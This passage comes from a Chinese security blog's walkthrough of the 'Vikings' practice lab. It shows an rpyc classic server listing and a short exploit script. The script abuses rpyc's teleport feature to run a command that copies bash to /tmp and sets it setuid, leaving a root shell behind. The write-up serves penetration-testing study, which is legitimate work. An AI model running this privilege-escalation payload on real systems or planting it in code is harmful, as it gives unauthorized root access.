<span class="keyword">import</span> SSLAuthenticator</span><br><span class="line"><span class="keyword">from</span> rpyc.lib <span class="keyword">import</span> setup_logger</span><br><span class="line"><span class="keyword">from</span> rpyc.core <span class="keyword">import</span> SlaveService</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassicServer</span><span class="params">(cli.Application)</span>:</span></span><br><span class="line">    mode = cli.SwitchAttr([<span class="string">"-m"</span>, <span class="string">"--mode"</span>], cli.Set(<span class="string">"threaded"</span>, <span class="string">"forking"</span>, <span class="string">"stdio"</span>, <span class="string">"oneshot"</span>),</span><br><span class="line">                          default=<span class="string">"threaded"</span>, help=<span class="string">"The serving mode (threaded, forking, or 'stdio' for "</span></span><br><span class="line">                          <span class="string">"inetd, etc.)"</span>)</span><br><span class="line"></span><br><span class="line">    port = cli.SwitchAttr([<span class="string">"-p"</span>, <span class="string">"--port"</span>], cli.Range(<span class="number">0</span>, <span class="number">65535</span>), default=<span class="literal">None</span>,</span><br><span class="line">                          help=<span class="string">"The TCP listener port (default = %s, default for SSL = %s)"</span> %</span><br><span class="line">                          (DEFAULT_SERVER_PORT, DEFAULT_SERVER_SSL_PORT), group=<span class="string">"Socket Options"</span>)</span><br><span class="line">    host = cli.SwitchAttr([<span class="string">"--host"</span>], str, default=<span class="string">""</span>, help=<span class="string">"The host to bind to. "</span></span><br><span class="line">                          <span class="string">"The default is localhost"</span>, group=<span class="string">"Socket Options"</span>)</span><br><span class="line">    ipv6 = cli.Flag([<span class="string">"--ipv6"</span>], help=<span class="string">"Enable IPv6"</span>, group=<span class="string">"Socket Options"</span>)</span><br><span class="line"></span><br><span class="line">    logfile = cli.SwitchAttr(<span class="string">"--logfile"</span>, str, default=<span class="literal">None</span>, help=<span class="string">"Specify the log file to use; "</span></span><br><span class="line">                             <span class="string">"the default is stderr"</span>, group=<span class="string">"Logging"</span>)</span><br><span class="line">    quiet = cli.Flag([<span class="string">"-q"</span>, <span class="string">"--quiet"</span>], help=<span class="string">"Quiet mode (only errors will be logged)"</span>,</span><br><span class="line">                     group=<span class="string">"Logging"</span>)</span><br><span class="line"></span><br><span class="line">    ssl_keyfile = cli.SwitchAttr(<span class="string">"--ssl-keyfile"</span>, cli.ExistingFile,</span><br><span class="line">                                 help=<span class="string">"The keyfile to use for SSL. Required for SSL"</span>, group=<span class="string">"SSL"</span>,</span><br><span class="line">                                 requires=[<span class="string">"--ssl-certfile"</span>])</span><br><span class="line">    ssl_certfile = cli.SwitchAttr(<span class="string">"--ssl-certfile"</span>, cli.ExistingFile,</span><br><span class="line">                                  help=<span class="string">"The certificate file to use for SSL. Required for SSL"</span>, group=<span class="string">"SSL"</span>,</span><br><span class="line">                                  requires=[<span class="string">"--ssl-keyfile"</span>])</span><br><span class="line">    ssl_cafile = cli.SwitchAttr(<span class="string">"--ssl-cafile"</span>, cli.ExistingFile,</span><br><span class="line">                                help=<span class="string">"The certificate authority chain file to use for SSL. "</span></span><br><span class="line">                                <span class="string">"Optional; enables client-side authentication"</span>,</span><br><span class="line">                                group=<span class="string">"SSL"</span>, requires=[<span class="string">"--ssl-keyfile"</span>])</span><br><span class="line"></span><br><span class="line">    auto_register = cli.Flag(<span class="string">"--register"</span>, help=<span class="string">"Asks the server to attempt registering with "</span></span><br><span class="line">                             <span class="string">"a registry server. By default, the server will not attempt to register"</span>,</span><br><span class="line">                             group=<span class="string">"Registry"</span>)</span><br><span class="line">    registry_type = cli.SwitchAttr(<span class="string">"--registry-type"</span>, cli.Set(<span class="string">"UDP"</span>, <span class="string">"TCP"</span>),</span><br><span class="line">                                   default=<span class="string">"UDP"</span>, help=<span class="string">"Specify a UDP or TCP registry"</span>, group=<span class="string">"Registry"</span>)</span><br><span class="line">    registry_port = cli.SwitchAttr(<span class="string">"--registry-port"</span>, cli.Range(<span class="number">0</span>, <span class="number">65535</span>), default=REGISTRY_PORT,</span><br><span class="line">                                   help=<span class="string">"The registry's UDP/TCP port"</span>, group=<span class="string">"Registry"</span>)</span><br><span class="line">    registry_host = cli.SwitchAttr(<span class="string">"--registry-host"</span>, str, default=<span class="literal">None</span>,</span><br><span class="line">                                   help=<span class="string">"The registry host machine. For UDP, the default is 255.255.255.255; "</span></span><br><span class="line">                                   <span class="string">"for TCP, a value is required"</span>, group=<span class="string">"Registry"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.host:</span><br><span class="line">            self.host = <span class="string">"::1"</span> <span class="keyword">if</span> self.ipv6 <span class="keyword">else</span> <span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.registry_type == <span class="string">"UDP"</span>:</span><br><span class="line">            <span class="keyword">if</span> self.registry_host <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                self.registry_host = <span class="string">"255.255.255.255"</span></span><br><span class="line">            self.registrar = UDPRegistryClient(ip=self.registry_host, port=self.registry_port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.registry_host <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"With TCP registry, you must specify --registry-host"</span>)</span><br><span class="line">            self.registrar = TCPRegistryClient(ip=self.registry_host, port=self.registry_port)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.ssl_keyfile:</span><br><span class="line">            self.authenticator = SSLAuthenticator(self.ssl_keyfile, self.ssl_certfile,</span><br><span class="line">                                                  self.ssl_cafile)</span><br><span class="line">            default_port = DEFAULT_SERVER_SSL_PORT</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.authenticator = <span class="literal">None</span></span><br><span class="line">            default_port = DEFAULT_SERVER_PORT</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = default_port</span><br><span class="line"></span><br><span class="line">        setup_logger(self.quiet, self.logfile)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.mode == <span class="string">"threaded"</span>:</span><br><span class="line">            self._serve_mode(ThreadedServer)</span><br><span class="line">        <span class="keyword">elif</span> self.mode == <span class="string">"forking"</span>:</span><br><span class="line">            self._serve_mode(ForkingServer)</span><br><span class="line">        <span class="keyword">elif</span> self.mode == <span class="string">"oneshot"</span>:</span><br><span class="line">            self._serve_oneshot()</span><br><span class="line">        <span class="keyword">elif</span> self.mode == <span class="string">"stdio"</span>:</span><br><span class="line">            self._serve_stdio()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_serve_mode</span><span class="params">(self, factory)</span>:</span></span><br><span class="line">        t = factory(SlaveService, hostname=self.host, port=self.port,</span><br><span class="line">                    reuse_addr=<span class="literal">True</span>, ipv6=self.ipv6, authenticator=self.authenticator,</span><br><span class="line">                    registrar=self.registrar, auto_register=self.auto_register)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_serve_oneshot</span><span class="params">(self)</span>:</span></span><br><span class="line">        t = OneShotServer(SlaveService, hostname=self.host, port=self.port,</span><br><span class="line">                          reuse_addr=<span class="literal">True</span>, ipv6=self.ipv6, authenticator=self.authenticator,</span><br><span class="line">                          registrar=self.registrar, auto_register=self.auto_register)</span><br><span class="line">        t._listen()</span><br><span class="line">        sys.stdout.write(<span class="string">"rpyc-oneshot\n"</span>)</span><br><span class="line">        sys.stdout.write(<span class="string">"%s\t%s\n"</span> % (t.host, t.port))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_serve_stdio</span><span class="params">(self)</span>:</span></span><br><span class="line">        origstdin = sys.stdin</span><br><span class="line">        origstdout = sys.stdout</span><br><span class="line">        sys.stdin = open(os.devnull, <span class="string">"r"</span>)</span><br><span class="line">        sys.stdout = open(os.devnull, <span class="string">"w"</span>)</span><br><span class="line">        sys.stderr = open(os.devnull, <span class="string">"w"</span>)</span><br><span class="line">        conn = rpyc.classic.connect_pipes(origstdin, origstdout)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn.serve_all()</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                print(<span class="string">"User interrupt!"</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    ClassicServer.run()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line">conn = rpyc.classic.connect(<span class="string">'localhost'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        os.system(<span class="string">'cp /bin/bash /tmp/bashroot &amp;&amp; chmod +s /tmp/bashroot'</span>)</span><br><span class="line"></span><br><span class="line">fn = conn.teleport(getshell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./Vikings/16.png" alt></p>
+<p><img data-src="./Vikings/17.png" alt></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%85%A5%E9%97%A8/" rel="tag"># 入门</a>
+              <a href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/" rel="tag"># 综合靶场测试</a>
+              <a href="/tags/Vikings/" rel="tag"># Vikings</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/17/blog_formal/%E5%B7%A5%E5%85%B7/hexo%E9%83%A8%E7%BD%B2github/" rel="prev" title="hexo部署github">
+      <i class="fa fa-chevron-left"></i> hexo部署github
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Vikings"><span class="nav-number">1.</span> <span class="nav-text">Vikings</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础环境"><span class="nav-number">1.2.</span> <span class="nav-text">基础环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试步骤"><span class="nav-number">1.3.</span> <span class="nav-text">测试步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#发现目标"><span class="nav-number">1.3.1.</span> <span class="nav-text">发现目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#登录web"><span class="nav-number">1.3.2.</span> <span class="nav-text">登录web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权-amp-amp-ROOT"><span class="nav-number">1.3.3.</span> <span class="nav-text">提权&amp;&amp;ROOT</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="菜心"
+      src="/images/avatar1.gif">
+  <p class="site-author-name" itemprop="name">菜心</p>
+  <div class="site-description" itemprop="description">目标&&付出</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">197</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">125</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+      
+        <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+        <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+        <div class="widget-wrap">
+            <h3 class="widget-title">Tag Cloud</h3>
+            <div id="myCanvasContainer" class="widget tagcloud">
+                <canvas width="250" height="250" id="resCanvas" style="width=100%">
+                    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/git%E6%B3%84%E9%9C%B2/" rel="tag">.git泄露</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/user-ini%E6%96%87%E4%BB%B6/" rel="tag">.user.ini文件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">==绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Beelzebub/" rel="tag">Beelzebub</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bluesmoke/" rel="tag">Bluesmoke</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Book-shelf/" rel="tag">Book-shelf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BoredHackerBlog/" rel="tag">BoredHackerBlog</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE/" rel="tag">CVE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Corrosion/" rel="tag">Corrosion</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DC/" rel="tag">DC</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DDE/" rel="tag">DDE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DarkHole/" rel="tag">DarkHole</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Deathnote/" rel="tag">Deathnote</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dos%E6%94%BB%E5%87%BB/" rel="tag">Dos攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Excel/" rel="tag">Excel</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HarryPotter/" rel="tag">HarryPotter</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heist/" rel="tag">Heist</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICA/" rel="tag">ICA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jangow/" rel="tag">Jangow</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KB-VULN/" rel="tag">KB-VULN</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MD5%E7%BB%95%E8%BF%87/" rel="tag">MD5绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Matrix/" rel="tag">Matrix</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Matrix-Breakout-2-Morpheus/" rel="tag">Matrix-Breakout 2_Morpheus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Napping/" rel="tag">Napping</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NoSQL%E6%B3%A8%E5%85%A5/" rel="tag">NoSQL注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Red/" rel="tag">Red</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Thales/" rel="tag">Thales</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/The-Planets/" rel="tag">The Planets</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/URL%E9%87%8D%E5%AE%9A%E5%90%91/" rel="tag">URL重定向</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vikings/" rel="tag">Vikings</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Machine/" rel="tag">Web Machine</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XFF/" rel="tag">XFF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XFF%E7%BB%95%E8%BF%87/" rel="tag">XFF绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/binwalk/" rel="tag">binwalk</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie%E7%99%BB%E5%BD%95/" rel="tag">cookie登录</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/doubletrouble/" rel="tag">doubletrouble</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask-ssti/" rel="tag">flask ssti</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask-session%E7%A0%B4%E8%A7%A3/" rel="tag">flask_session破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz%E6%B5%8B%E8%AF%95/" rel="tag">fuzz测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackme/" rel="tag">hackme</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackme2/" rel="tag">hackme2</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hacksudo/" rel="tag">hacksudo</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hash-hmac-sha256%E7%BB%95%E8%BF%87/" rel="tag">hash_hmac_sha256绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http%E5%8D%8F%E8%AE%AE/" rel="tag">http协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/others/" rel="tag">others</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="tag">php变量覆盖</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/" rel="tag">php弱类型比较</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">php文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">php无参数RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%87%BD%E6%95%B0/" rel="tag">python函数</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%88%97%E8%A1%A8%E3%80%81%E5%85%83%E7%BB%84%E3%80%81%E5%AD%97%E5%85%B8%E5%92%8C%E9%9B%86%E5%90%88/" rel="tag">python列表、元组、字典和集合</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6/" rel="tag">python变量类型和运算符</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/" rel="tag">python字符串&&流程控制</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%B9%B6%E5%8F%91/" rel="tag">python并发</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/" rel="tag">python类和对象</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E7%B1%BB%E7%9A%84%E7%89%B9%E6%AE%8A%E6%88%90%E5%91%98-%E5%B1%9E%E6%80%A7-%E6%96%B9%E6%B3%95/" rel="tag">python类的特殊成员(属性&方法)</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E8%AF%AD%E6%84%9F/" rel="tag">python语感</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/regex/" rel="tag">regex</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/robots-txt/" rel="tag">robots.txt</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby-web-%E6%B3%A8%E5%85%A5/" rel="tag">ruby web 注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sha%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/" rel="tag">sha弱类型比较绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shenron/" rel="tag">shenron</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shopxocms/" rel="tag">shopxocms</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssti/" rel="tag">ssti</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/strcmp%E7%BB%95%E8%BF%87/" rel="tag">strcmp绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/supervisor/" rel="tag">supervisor</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/symfonos/" rel="tag">symfonos</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tornado/" rel="tag">tornado</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unicode/" rel="tag">unicode</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/y0usef/" rel="tag">y0usef</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">任意命令执行</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%A5%E9%97%A8/" rel="tag">入门</a><span class="tag-list-count">92</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">内网渗透测试</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag">前端信息泄露</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%95%E5%85%B5%E8%83%BD%E5%8A%9B/" rel="tag">单兵能力</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8/" rel="tag">压缩包安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8/" rel="tag">参数逃逸</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag">命令注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" rel="tag">命令注入绕过</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" rel="tag">哈希扩展攻击</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A5%87%E6%B7%AB/" rel="tag">奇淫</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A5%97%E5%A8%83/" rel="tag">套娃</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/" rel="tag">布尔注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%80%E6%BA%90CMS/" 